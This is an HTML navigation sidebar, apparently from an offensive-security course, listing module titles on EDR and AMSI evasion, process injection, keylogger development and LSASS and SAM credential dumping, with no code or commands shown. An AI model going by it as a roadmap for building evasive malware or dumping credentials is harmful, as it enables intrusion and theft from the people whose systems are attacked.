                    <div for="module-3" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 3 - Custom WinAPI Functions
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-4" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./4.html">
                    <div for="module-4" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 4 - Exploiting EDRs For Evasion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-5" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./5.html">
                    <div for="module-5" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 5 - Introduction To MASM Assembly
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-6" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./6.html">
                    <div for="module-6" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 6 - Evasion With File Bloating
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-7" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./7.html">
                    <div for="module-7" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 7 - Bring Your Own Protocol Handler
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-8" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./8.html">
                    <div for="module-8" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 8 - Bring Your Own File Extension
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-9" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./9.html">
                    <div for="module-9" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 9 - Utilizing Hardware Breakpoints For Hooking (1)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-10" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./10.html">
                    <div for="module-10" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 10 - Utilizing Hardware Breakpoints For Hooking (2)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-11" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./11.html">
                    <div for="module-11" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 11 - Utilizing Hardware Breakpoints For Credential Dumping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-12" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./12.html">
                    <div for="module-12" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 12 - Event Tracing For Windows - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-13" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./13.html">
                    <div for="module-13" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 13 - Event Tracing For Windows - ETW Tools
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-14" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./14.html">
                    <div for="module-14" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 14 - Event Tracing For Windows - ETW Bypass Via Byte Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-15" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./15.html">
                    <div for="module-15" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 15 - Event Tracing for Windows - Improved Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-16" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./16.html">
                    <div for="module-16" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 16 - Event Tracing for Windows - Patchless ETW Bypass Via HBPs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-17" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./17.html">
                    <div for="module-17" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 17 - Event Tracing For Windows - ETW Provider Session Hijacking
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-18" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./18.html">
                    <div for="module-18" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 18 - Antimalware Scan Interface - Introduction
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-19" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./19.html">
                    <div for="module-19" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 19 - Antimalware Scan Interface - AMSI Bypass Via Byte Patching
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-20" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./20.html">
                    <div for="module-20" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 20 - Antimalware Scan Interface - AMSI Bypass Via HBPs
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-21" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./21.html">
                    <div for="module-21" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 21 - Building a DRM-equipped Malware
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-22" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./22.html">
                    <div for="module-22" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 22 - Introduction to Havoc C&amp;C
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-23" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./23.html">
                    <div for="module-23" class="ml-2 text-sm font-medium 
                                bg-blue-700 font-bold rounded-sm">
                        Module 23 - Building An Evasive DLL Payload Loader
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-24" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./24.html">
                    <div for="module-24" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 24 - Introduction To DLL Sideloading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-25" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./25.html">
                    <div for="module-25" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 25 - Practical DLL Sideloading Example
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-26" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./26.html">
                    <div for="module-26" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 26 - DLL Sideloading For EDR Evasion
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-27" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./27.html">
                    <div for="module-27" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 27 - Bring Your Own Vulnerable Driver
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-28" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./28.html">
                    <div for="module-28" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 28 - Local PE Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-29" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./29.html">
                    <div for="module-29" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 29 - Reflective DLL Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-30" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./30.html">
                    <div for="module-30" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 30 - PeFluctuation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-31" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./31.html">
                    <div for="module-31" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 31 - Building a PE Packer
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-32" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./32.html">
                    <div for="module-32" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 32 - Malware Directory Placement
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-33" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./33.html">
                    <div for="module-33" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 33 - Utilizing Fibers For Payload Execution
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-34" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./34.html">
                    <div for="module-34" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 34 - TLS Callbacks For Anti-Debugging
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-35" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./35.html">
                    <div for="module-35" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 35 - Threadless Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-36" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./36.html">
                    <div for="module-36" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 36 - Module Stomping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-37" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./37.html">
                    <div for="module-37" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 37 - Module Overloading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-38" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./38.html">
                    <div for="module-38" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 38 - Process Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-39" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./39.html">
                    <div for="module-39" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 39 - Ghost Process Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-40" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./40.html">
                    <div for="module-40" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 40 - Ghostly Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-41" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./41.html">
                    <div for="module-41" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 41 - Herpaderping Process Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-42" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./42.html">
                    <div for="module-42" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 42 - Herpaderply Hollowing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-43" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./43.html">
                    <div for="module-43" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 43 - Shellcode Reflective DLL Injection (sRDI)
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-44" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./44.html">
                    <div for="module-44" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 44 - Patchless Threadless Injection Via Hardware BreakPoints
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-45" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./45.html">
                    <div for="module-45" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 45 - Tampered Syscalls Via Hardware BreakPoints
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-46" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./46.html">
                    <div for="module-46" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 46 - Exploiting EDRs For Evasion - Preventing EDR From Taking Action
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-47" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./47.html">
                    <div for="module-47" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 47 - Exploiting EDRs For Evasion - EDR LOLBINS
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-48" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./48.html">
                    <div for="module-48" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 48 - Process Hypnosis
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-49" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./49.html">
                    <div for="module-49" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 49 - Introduction To Object Files
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-50" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./50.html">
                    <div for="module-50" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 50 - Writing Beacon Object Files
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-51" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./51.html">
                    <div for="module-51" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 51 - Object File Loading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-52" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./52.html">
                    <div for="module-52" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 52 - Exploiting EDRs For Evasion - Finding Internal Exclusion List
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-53" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./53.html">
                    <div for="module-53" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 53 - Introduction To Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-54" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./54.html">
                    <div for="module-54" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 54 - Introduction to Ekko and Zilean Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-55" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./55.html">
                    <div for="module-55" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 55 - Introduction to Foliage Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-56" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./56.html">
                    <div for="module-56" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 56 - Implementing Ekko With Stack Spoofing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-57" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./57.html">
                    <div for="module-57" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 57 - Token Manipulation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-58" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./58.html">
                    <div for="module-58" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 58 - Library Proxy Loading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-59" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./59.html">
                    <div for="module-59" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 59 - Heap Encryption With Ekko Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-60" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./60.html">
                    <div for="module-60" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 60 - Introduction To Executing .NET Assemblies 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-61" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./61.html">
                    <div for="module-61" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 61 - Evading Microsoft Defender Via Patching 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-62" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./62.html">
                    <div for="module-62" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 62 - .NET Assemblies - Patching System.Environment.Exit
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-63" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./63.html">
                    <div for="module-63" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 63 - Capturing And Saving Screenshots Into Memory
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-64" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./64.html">
                    <div for="module-64" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 64 - Cross-Architecture Injection: x86 to x64 Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-65" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./65.html">
                    <div for="module-65" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 65 - KnownDll Cache Poisoning Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-66" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./66.html">
                    <div for="module-66" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 66 - Introduction to Keylogging
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-67" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./67.html">
                    <div for="module-67" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 67 - Developing a Keylogger
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-68" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./68.html">
                    <div for="module-68" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 68 - Sending Keystrokes To Remote Server
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-69" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./69.html">
                    <div for="module-69" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 69 - Manipulating VEH For Local Code Execution 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-70" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./70.html">
                    <div for="module-70" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 70 - Introduction To LSASS Dumping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-71" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./71.html">
                    <div for="module-71" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 71 - Fetching LSASS Handle And Bypassing PPL
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-72" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./72.html">
                    <div for="module-72" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 72 - LSASS Dump Via Handle Duplication
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-73" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./73.html">
                    <div for="module-73" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 73 - LSASS Dump Via RtlReportSilentProcessExit
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-74" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./74.html">
                    <div for="module-74" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 74 - LSASS Dump Via Seclogon Race Condition
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-75" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./75.html">
                    <div for="module-75" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 75 - Dumping The SAM Database
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-76" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./76.html">
                    <div for="module-76" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 76 - Dumping The SAM Remotely
                    </div>
                </a>
            </div>
